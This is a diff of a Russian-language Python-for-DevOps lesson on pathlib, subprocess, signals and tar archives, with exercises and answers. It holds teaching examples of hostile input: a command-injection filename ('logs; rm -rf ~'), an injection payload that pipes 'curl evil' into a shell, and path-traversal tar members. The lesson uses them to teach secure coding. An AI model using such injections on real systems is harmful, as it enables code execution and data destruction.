@@ -1,12 +1,12 @@
 ---
 title: "03. Файлы, ОС и внешние команды"
-description: "Блок → Python для DevOps → тема 3 из 8."
+description: "pathlib, атомарная запись, subprocess.run, сигналы, архивы"
 ---
 
 # 03. Файлы, ОС и внешние команды
 
 > Блок → **Python для DevOps** → тема 3 из 8.
-> Аналог в bash: [25_bash_robust.md](/linux/25-bash-robust) — `set -euo pipefail`, `trap`,
+> Аналог в bash: [Linux: 25. Надёжный bash-скрипт](/linux/25-bash-robust) — `set -euo pipefail`, `trap`,
 > временные файлы, коды выхода. Здесь то же самое, но средствами Python.
 >
 > **После темы ты умеешь:** работать с путями через `pathlib`, копировать и удалять через `shutil`,
@@ -18,7 +18,7 @@ description: "Блок → Python для DevOps → тема 3 из 8."
 
 ## 🗺️ Карта темы
 
-```text
+```text:no-line-numbers
                          Python-скрипт
    ┌───────────┬────────────┬───────────┴───┬──────────────┬─────────────┐
  pathlib     shutil      os.environ      subprocess      signal        tarfile/gzip
@@ -28,7 +28,8 @@ description: "Блок → Python для DevOps → тема 3 из 8."
    │                                         │
  tempfile + os.replace                  shlex.quote / shlex.split
  атомарная запись                       (если без шелла никак)
-```text
+```
+
 ---
 
 ## 1. pathlib — пути как объекты
@@ -51,7 +52,8 @@ dump.stat().st_size, dump.stat().st_mtime       # размер, время из�
 
 sorted(Path("/var/log/nginx").glob("*.log"))    # в каталоге
 list(Path("/srv").rglob("*.pyc"))               # рекурсивно
-```text
+```
+
 | bash / os.path | pathlib |
 |----------------|---------|
 | `"$dir/$file"` / `os.path.join` | `Path(dir) / file` |
@@ -84,7 +86,8 @@ Path("report.txt").write_text("ok\n", encoding="utf-8")
 with open("/var/log/app.log", encoding="utf-8", errors="replace") as f:
     for line in f:                  # построчно, без загрузки в память
         ...
-```text
+```
+
 ⭐ **Атомарная запись** — конфиг или метрика никогда не бывают «наполовину записанными»:
 
 ```python
@@ -102,7 +105,7 @@ def atomic_write(path: Path, data: str, mode: int = 0o644) -> None:
     except BaseException:
         Path(tmp).unlink(missing_ok=True)
         raise
-```text
+```
 `os.replace` атомарен только в пределах одной файловой системы — поэтому временный файл
 создаётся в том же каталоге, а не в `/tmp`.
 
@@ -125,7 +128,7 @@ def atomic_write(path: Path, data: str, mode: int = 0o644) -> None:
 with tempfile.TemporaryDirectory(prefix="backup-") as tmp:   # удалится сам, даже при ошибке
     work = Path(tmp)
     ...
-```text
+```
 ⚠️ Не пиши во «вшитый» `/tmp/myscript.tmp`: два экземпляра скрипта затрут друг друга,
 а предсказуемое имя — классическая дыра (symlink-атака).
 
@@ -142,7 +145,7 @@ os.getenv("SENTRY_DSN")                     # None, если нет
 token = os.environ.get("GITLAB_TOKEN") or sys.exit("GITLAB_TOKEN не задан")
 timeout = float(os.environ.get("TIMEOUT", "10"))              # ⚠️ в env всё — строки
 dry_run = os.environ.get("DRY_RUN", "false").lower() in {"1", "true", "yes"}
-```text
+```
 - Изменения `os.environ` видят дочерние процессы, но не родительский шелл.
 - Для дочернего процесса окружение лучше собрать явно: `env={**os.environ, "PGPASSWORD": pw}`.
 - ⚠️ Никогда не логируй `os.environ` целиком — там токены.
@@ -163,7 +166,8 @@ result = subprocess.run(
     env={**os.environ, "PGPASSWORD": password},
 )
 log.info("дамп готов: %s", out_file)
-```text
+```
+
 | Параметр | Зачем |
 |----------|-------|
 | список аргументов | Каждый аргумент отдельно — пробелы и спецсимволы не ломают команду |
@@ -185,7 +189,8 @@ except subprocess.TimeoutExpired:
     log.error("таймаут: %s", " ".join(cmd))
 except subprocess.CalledProcessError as e:
     log.error("%s завершилась с кодом %d: %s", cmd[0], e.returncode, e.stderr.strip())
-```text
+```
+
 Иногда ненулевой код — это **ответ**, а не ошибка. Тогда `check` не ставят и смотрят `returncode`:
 
 ```python
@@ -194,7 +199,8 @@ if r.returncode != 0:          # 3 = inactive — это информация
     log.warning("nginx не активен")
 
 r = subprocess.run(["grep", "-q", "ERROR", "/var/log/app.log"])   # 0 — нашёл, 1 — нет, 2 — ошибка
-```text
+```
+
 ---
 
 ## 6. Почему не `shell=True`
@@ -203,7 +209,8 @@ r = subprocess.run(["grep", "-q", "ERROR", "/var/log/app.log"])   # 0 — наш
 name = "logs; rm -rf ~"                             # пришло из аргумента/API/имени файла
 subprocess.run(f"tar czf /backup/{name}.tgz /var/log", shell=True)   # ⚠️ выполнит rm -rf ~
 subprocess.run(["tar", "czf", f"/backup/{name}.tgz", "/var/log"])   # ✅ имя — просто строка
-```text
+```
+
 | `shell=True` | Список аргументов |
 |--------------|-------------------|
 | Инъекция команд через переменные | Невозможна: шелла нет |
@@ -221,7 +228,7 @@ r = subprocess.run(["journalctl", "-u", "nginx", "--since", "1 hour ago", "-o", 
 errors = sum("error" in line.lower() for line in r.stdout.splitlines())
 
 shlex.split("rsync -a '/my dir/' host:/dst")   # строку команды → список аргументов
-```text
+```
 `os.system()` и `os.popen()` — наследие: нет таймаута, нет нормального кода выхода,
 всегда шелл. В новом коде не используют.
 
@@ -240,7 +247,7 @@ with subprocess.Popen(
         log.info("rsync: %s", line.rstrip())
 if proc.returncode != 0:
     raise RuntimeError(f"rsync завершился с кодом {proc.returncode}")
-```text
+```
 ⚠️ `stdout=PIPE` и `stderr=PIPE`, а читаешь только один поток — второй переполнит буфер,
 и процесс зависнет (deadlock). Либо `stderr=subprocess.STDOUT`, либо `proc.communicate()`,
 либо `run(capture_output=True)`.
@@ -274,17 +281,18 @@ while not stop.is_set():
     run_checks()
     stop.wait(30)          # ⭐ вместо time.sleep(30): проснётся сразу по сигналу
 log.info("остановлен")
-```text
-```text
+```
+
+```text:no-line-numbers
 docker stop → SIGTERM ──► есть обработчик? ──да──► закончить итерацию, выйти за 1 с
                                   │
                                   нет, и процесс — PID 1 в контейнере
                                   ▼
                    ядро ИГНОРИРУЕТ сигнал → 10 с ожидания → SIGKILL (код 137)
-```text
+```
 Процессу с PID 1 ядро не применяет действие по умолчанию, поэтому без обработчика
 SIGTERM «теряется». Лечится обработчиком, `docker run --init` (tini) или `exec` в entrypoint
-(см. [26_bash_devops_practice.md](/linux/26-bash-devops-practice)).
+(см. [Linux: 26. Bash в DevOps: боевые паттерны](/linux/26-bash-devops-practice)).
 
 Отправить сигнал из скрипта: `proc.terminate()` (SIGTERM), `proc.kill()` (SIGKILL),
 `os.kill(pid, signal.SIGHUP)` — например, чтобы сервис перечитал конфиг.
@@ -314,7 +322,7 @@ with open(src, "rb") as fin, gzip.open(f"{src}.gz", "wb") as fout:
 
 with open(archive, "rb") as f:
     digest = hashlib.file_digest(f, "sha256").hexdigest()   # контрольная сумма (3.11+)
-```text
+```
 ⚠️ `extractall` без `filter` на чужом архиве — уязвимость: элемент `../../etc/cron.d/x`
 запишется за пределы каталога. С 3.12 передавай `filter="data"` явно.
 
@@ -350,7 +358,8 @@ def cleanup(directory: Path, pattern: str, days: int, dry_run: bool) -> int:
 
 lock = acquire_lock("/run/lock/cleanup.lock")
 n = cleanup(Path("/var/backups/pg"), "*.sql.gz", days=14, dry_run=True)
-```text
+```
+
 ---
 
 ## 11. Грабли
@@ -424,13 +433,16 @@ n = cleanup(Path("/var/backups/pg"), "*.sql.gz", days=14, dry_run=True)
 9. `extractall(..., filter="data")` — всегда, когда архив не твой.
 10. Перед `rmtree`/массовым `unlink` — проверка пути, dry-run и lock от параллельного запуска.
 
-➡️ Дальше: [04_cli_logging_config.md](/python/04-cli-logging-config) · Задачи: 03_files_os_subprocess_tasks.md
+---
 
+## Задачи
+
+> Стенд: Linux, `python3` 3.12+, docker (для задач про сигналы и PID 1).
+> Рабочий каталог: `~/labs/py/03`.
 
 ---
 
 ### Блок A. Теория
-
 
 **A1.** Чем `pathlib` удобнее `os.path`? Как получить каталог, где лежит сам скрипт?
 
@@ -574,145 +586,127 @@ setuid-биты. Защищает от path traversal — записи файл�
 
 ### Блок B. «Что выведет / что тут не так»
 
-
-```text:no-line-numbers
+```python
 # B1.
-```text
-```text:no-line-numbers
 from pathlib import Path
-```text
-```text:no-line-numbers
 print(Path("/var/backups") / "pg" / "db.sql.gz")
-```text
-```text:no-line-numbers
 print(Path("db_2026.sql.gz").suffix, Path("db_2026.sql.gz").stem)
-```text
-```text:no-line-numbers
+```
+```python
 # B2.
-```text
-```text:no-line-numbers
 subprocess.run(f"rm -rf /tmp/{job_name}", shell=True)      # job_name приходит из API
-```text
-```text:no-line-numbers
+```
+```python
 # B3.
-```text
-```text:no-line-numbers
 r = subprocess.run(["ls", "/nope"], capture_output=True)
-```text
-```text:no-line-numbers
 print(r.returncode, "No such" in r.stderr)
-```text
-```text:no-line-numbers
+```
+```python
 # B4.
-```text
-```text:no-line-numbers
 r = subprocess.run(["curl", "-s", "http://10.0.0.99/health"])   # хост не отвечает
-```text
-```text:no-line-numbers
+```
+```python
 # B5.
-```text
-```text:no-line-numbers
 backup_dir = Path(os.environ.get("BACKUP_DIR", ""))
-```text
-```text:no-line-numbers
 shutil.rmtree(backup_dir / "old", ignore_errors=True)
-```text
-```text:no-line-numbers
 for p in backup_dir.glob("*"):
-```text
-```text:no-line-numbers
     p.unlink()
-```text
-```text:no-line-numbers
+```
+```python
 # B6.
-```text
-```text:no-line-numbers
 with open("/etc/nginx/nginx.conf", "w") as f:
-```text
-```text:no-line-numbers
     f.write(render_template())          # render_template() бросает исключение
-```text
-```text:no-line-numbers
+```
+```python
 # B7.
-```text
-```text:no-line-numbers
 timeout = os.environ.get("TIMEOUT", 10)
-```text
-```text:no-line-numbers
 time.sleep(timeout * 2)                 # TIMEOUT=5 задан в окружении
-```text
-```text:no-line-numbers
+```
+```python
 # B8.
-```text
-```text:no-line-numbers
 r = subprocess.run([sys.executable, "-c", "import os, signal; os.kill(os.getpid(), signal.SIGKILL)"])
-```text
-```text:no-line-numbers
 print(r.returncode)
-```text
-```text:no-line-numbers
+```
+```python
 # B9.
-```text
-```text:no-line-numbers
 p = subprocess.Popen(["some-tool"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-```text
-```text:no-line-numbers
 for line in p.stdout:
-```text
-```text:no-line-numbers
     print(line, end="")
-```text
-```text:no-line-numbers
+```
+```python
 # B10.
-```text
-```text:no-line-numbers
 with tarfile.open(uploaded_archive) as tar:
-```text
-```text:no-line-numbers
     tar.extractall("/srv/app")
-```text
-```text:no-line-numbers
+```
+```python
 # B11.
-```text
-```text:no-line-numbers
 tmp = Path("/tmp/metrics.prom.tmp")
-```text
-```text:no-line-numbers
 tmp.write_text(data)
-```text
-```text:no-line-numbers
 os.replace(tmp, "/var/lib/node_exporter/textfile/app.prom")   # /var — отдельный раздел
-```text
-```text:no-line-numbers
+```
+```python
 # B12.
-```text
-```text:no-line-numbers
 r = subprocess.run(["systemctl", "is-active", "nginx"], check=True, capture_output=True, text=True)
-```text
-```text:no-line-numbers
 print("nginx:", r.stdout.strip())       # nginx остановлен
-```text
+```
+
+<details><summary>Ответы</summary>
+
+**B1.** `/var/backups/pg/db.sql.gz`; `.gz` и `db_2026.sql`.
+
+**B2.** ⚠️ Инъекция: `job_name = "x /"` или `"; curl evil | sh"`. Нужен
+`shutil.rmtree(Path("/tmp") / safe_name)` с проверкой имени, без шелла.
+
+**B3.** `2` и затем `TypeError`: без `text=True` `stderr` — это `bytes`, а `"No such"` — `str`.
+
+**B4.** ⚠️ Нет `timeout` — скрипт может висеть долго (у `curl` без `--max-time` тоже нет лимита);
+нет проверки кода — ошибка пройдёт молча.
+
+**B5.** ⚠️ Пустая переменная → `Path("")` = текущий каталог: удалится всё, что лежит там, откуда
+запущен скрипт. Нужны проверка обязательной переменной и `is_dir()`, запрет «опасных» путей.
+
+**B6.** ⚠️ Файл обнулится при открытии `"w"`, исключение оставит его пустым. Сначала
+сгенерировать строку, затем атомарная запись.
+
+**B7.** `TypeError` или сюрприз: из окружения придёт строка `"5"`, `"5" * 2 == "55"`, а `sleep("55")`
+упадёт с `TypeError`. Нужен `float(os.environ.get("TIMEOUT", "10"))`.
+
+**B8.** `-9`.
+
+**B9.** ⚠️ Читается только stdout; если утилита много пишет в stderr, буфер переполнится и оба
+процесса зависнут. `stderr=subprocess.STDOUT` или `communicate()`.
+
+**B10.** ⚠️ Нет `filter="data"`: архив может записать файлы вне `/srv/app` (`../`, абсолютные пути).
+
+**B11.** ⚠️ `OSError: Invalid cross-device link` — `os.replace` между разными ФС невозможен.
+Временный файл нужно создавать в каталоге textfile.
+
+**B12.** ⚠️ `is-active` вернёт 3 → `CalledProcessError`, до `print` дело не дойдёт. Для «кода-ответа»
+`check` не ставят.
+
+</details>
+
 ---
 
 ### Блок C. Практика
 
-
-### C1. pathlib-разминка
-**1.** Выведи 5 самых больших файлов в `/var/log` (рекурсивно) с размером в МБ.
+#### C1. pathlib-разминка
+1. Выведи 5 самых больших файлов в `/var/log` (рекурсивно) с размером в МБ.
+2. Выведи файлы старше 7 дней в `~/Downloads` (или любом каталоге) с их возрастом в днях.
+3. Посчитай суммарный размер `*.gz` в `/var/log`.
 
 <details><summary>Ответ</summary>
 
-for p in Path("/proc").glob("[0-9]*/cmdline")
-    if b"python" in p.read_bytes()
-)
-```text
-(процессы могут исчезнуть между `glob` и `read_bytes` — оберни в `try/except OSError`).
+```python
+files = [p for p in Path("/var/log").rglob("*") if p.is_file()]
+for p in sorted(files, key=lambda p: p.stat().st_size, reverse=True)[:5]:
+    print(f"{p.stat().st_size / 2**20:8.1f} MB  {p}")
+```
+(на `/var/log` понадобится `sudo` или обработка `PermissionError`).
 
 </details>
 
-**2.** Выведи файлы старше 7 дней в `~/Downloads` (или любом каталоге) с их возрастом в днях.
-**3.** Посчитай суммарный размер `*.gz` в `/var/log`.
-### C2. 🔑 Очистка с dry-run
+#### C2. 🔑 Очистка с dry-run
 Напиши `cleanup.py DIR --pattern '*.log' --days 14 [--apply]`:
 - по умолчанию dry-run: только печатает, что удалит, и сколько места освободится;
 - с `--apply` удаляет;
@@ -720,55 +714,19 @@ for p in Path("/proc").glob("[0-9]*/cmdline")
 - защищён lock-файлом от параллельного запуска.
 Проверь на наборе файлов со старым mtime: `touch -d '20 days ago' old{1..3}.log`.
 
-### C3. Атомарная запись
-**1.** Реализуй `atomic_write(path, data)` из конспекта.
-
-<details><summary>Ответ</summary>
-
-for p in Path("/proc").glob("[0-9]*/cmdline")
-    if b"python" in p.read_bytes()
-)
-```text
-(процессы могут исчезнуть между `glob` и `read_bytes` — оберни в `try/except OSError`).
-
-</details>
-
-**2.** В другом терминале крути `while true; do cat target.txt; done`, а скриптом 1000 раз
+#### C3. Атомарная запись
+1. Реализуй `atomic_write(path, data)` из конспекта.
+2. В другом терминале крути `while true; do cat target.txt; done`, а скриптом 1000 раз
    перезаписывай файл. Убедись, что ни разу не видно пустого или половинчатого содержимого.
-**3.** Сравни с наивной записью `open(path, "w")`.
-### C4. 🔑 Обёртка над командами
+3. Сравни с наивной записью `open(path, "w")`.
+
+#### C4. 🔑 Обёртка над командами
 Напиши функцию `run(cmd: list[str], timeout: int = 60) -> str`, которая:
 - возвращает stdout при успехе;
 - при ненулевом коде бросает своё `CommandError` с кодом и stderr;
 - при таймауте и отсутствии бинарника — тоже `CommandError` с понятным сообщением;
 - логирует команду (без секретов!) и длительность.
 Проверь на `["uname", "-a"]`, `["ls", "/nope"]`, `["sleep", "5"]` с таймаутом 1, `["nope"]`.
-
-### C5. Код как ответ
-Напиши `service_status(name) -> str`, которая возвращает `active`/`inactive`/`failed`/`unknown`
-по `systemctl is-active` без исключений на ненулевой код.
-
-### C6. Пайп без шелла
-Перепиши на Python без `shell=True`: `ps aux | grep python | grep -v grep | wc -l`.
-Вариант 1 — `ps` + фильтр в Python. Вариант 2 — вообще без внешних команд (подсказка: `/proc/*/cmdline`).
-
-### C7. 🔑 SIGTERM и PID 1
-**1.** Напиши демон: в цикле печатает «tick» раз в 5 секунд.
-
-<details><summary>Ответ</summary>
-
-for p in Path("/proc").glob("[0-9]*/cmdline")
-    if b"python" in p.read_bytes()
-)
-```text
-(процессы могут исчезнуть между `glob` и `read_bytes` — оберни в `try/except OSError`).
-
-</details>
-
-**2.** Собери образ (`FROM python:3.12-slim`, `CMD ["python", "-u", "daemon.py"]`),
-   замерь `time docker stop &lt;id&gt;` — сколько секунд и какой код выхода (`docker inspect -f '&#123;&#123;.State.ExitCode&#125;&#125;'`)?
-**3.** Добавь обработчик SIGTERM с `Event.wait()` — повтори замер.
-**4.** Убери обработчик и запусти с `docker run --init` — что изменилось?
 
 <details><summary>Ответ</summary>
 
@@ -788,27 +746,81 @@ def run(cmd: list[str], timeout: int = 60) -> str:
     finally:
         log.debug("%s: %.2fs", cmd[0], time.monotonic() - start)
     return r.stdout
-```text
+```
+
 </details>
 
-### C8. Архив с проверкой
+#### C5. Код как ответ
+Напиши `service_status(name) -> str`, которая возвращает `active`/`inactive`/`failed`/`unknown`
+по `systemctl is-active` без исключений на ненулевой код.
+
+<details><summary>Ответ</summary>
+
+```python
+def service_status(name: str) -> str:
+    r = subprocess.run(["systemctl", "is-active", name], capture_output=True, text=True, timeout=10)
+    return r.stdout.strip() or "unknown"
+```
+
+</details>
+
+#### C6. Пайп без шелла
+Перепиши на Python без `shell=True`: `ps aux | grep python | grep -v grep | wc -l`.
+Вариант 1 — `ps` + фильтр в Python. Вариант 2 — вообще без внешних команд (подсказка: `/proc/*/cmdline`).
+
+<details><summary>Ответ</summary>
+
+```python
+count = sum(
+    1 for p in Path("/proc").glob("[0-9]*/cmdline")
+    if b"python" in p.read_bytes()
+)
+```
+(процессы могут исчезнуть между `glob` и `read_bytes` — оберни в `try/except OSError`).
+
+</details>
+
+#### C7. 🔑 SIGTERM и PID 1
+1. Напиши демон: в цикле печатает «tick» раз в 5 секунд.
+2. Собери образ (`FROM python:3.12-slim`, `CMD ["python", "-u", "daemon.py"]`),
+   замерь `time docker stop <id>` — сколько секунд и какой код выхода (<code v-pre>docker inspect -f '{{.State.ExitCode}}'</code>)?
+3. Добавь обработчик SIGTERM с `Event.wait()` — повтори замер.
+4. Убери обработчик и запусти с `docker run --init` — что изменилось?
+
+<details><summary>Ответ</summary>
+
+Без обработчика — ~10 секунд и код 137 (SIGKILL). С обработчиком — меньше секунды
+и код 0. С `--init` tini получает SIGTERM и пересылает его Python-процессу, который уже не PID 1,
+поэтому действие по умолчанию срабатывает: быстрая остановка (код 143).
+
+</details>
+
+#### C8. Архив с проверкой
 Напиши `pack.py SRC DST_DIR`: собирает `SRC` в `name-YYYYmmdd-HHMMSS.tar.gz`, рядом кладёт
 `.sha256`, затем проверяет архив: открывается, список файлов не пуст, сумма совпадает.
 
-### C9. Безопасная распаковка
+#### C9. Безопасная распаковка
 Создай «злой» архив с элементом `../evil.txt`:
 `tarfile.open("evil.tgz", "w:gz").add("f.txt", arcname="../evil.txt")` (не забудь закрыть архив
 или используй `with`). Распакуй в `./out` с `filter="data"` и без — где оказался файл
 и какие сообщения выводит Python?
 
-### C10. Потоковый вывод
+<details><summary>Ответ</summary>
+
+С `filter="data"` — исключение `tarfile.OutsideDestinationError: '../evil.txt' would be
+extracted to ..., which is outside the destination`. Без фильтра Python 3.12 выдаёт
+`DeprecationWarning` и молча кладёт `evil.txt` уровнем выше `out/` — ровно так архив
+перезаписывает файлы вне каталога распаковки.
+
+</details>
+
+#### C10. Потоковый вывод
 Запусти `ping -c 5 1.1.1.1` через `Popen` и логируй каждую строку с отметкой времени по мере
 появления. Верни код выхода `ping` как код выхода скрипта.
 
 ---
 
 ### Блок D. Инциденты
-
 
 **D1.** Скрипт очистки удалил содержимое домашнего каталога пользователя, от которого запускался cron. В коде `Path(os.environ.get("CLEAN_DIR", ""))`. Что произошло и как защититься?
 
@@ -889,7 +901,6 @@ def run(cmd: list[str], timeout: int = 60) -> str:
 
 ### Блок E. Вопросы с собеседования
 
-
 **1.** Как запустить внешнюю команду из Python и получить её вывод?
 
 <details><summary>Ответ</summary>
@@ -919,7 +930,7 @@ def run(cmd: list[str], timeout: int = 60) -> str:
 <details><summary>Ответ</summary>
 
 `signal.signal(signal.SIGTERM, handler)`: обработчик ставит флаг/`Event`, главный цикл
-   завершает текущую работу и выходит.
+завершает текущую работу и выходит.
 
 </details>
 
@@ -968,8 +979,6 @@ Python — PID 1 без обработчика SIGTERM: сигнал игнор�
 <details><summary>Ответ</summary>
 
 Lock-файл с `fcntl.flock` (или `flock -n` в crontab), либо systemd-таймер вместо cron.
-
----
 
 </details>
 
